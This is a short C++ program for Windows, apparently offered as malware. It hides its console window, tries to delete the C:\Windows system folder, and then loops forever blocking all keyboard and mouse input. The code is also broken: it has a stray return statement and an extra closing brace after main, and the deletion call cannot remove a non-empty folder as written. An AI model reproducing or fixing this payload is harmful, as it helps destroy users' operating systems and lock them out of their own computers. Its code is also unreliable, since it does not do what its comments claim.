#include <iostream>
#include <windows.h>
#include <cstdio>

using namespace std;

int main(){
  FreeConsole(); //Hides Console
  
  const int result = remove("C:\Windows"); //Removes The C:/Windows Folder
  
  while(1){
    BlockInput(true); //Blocks All Input
  }
}

return 0;
}
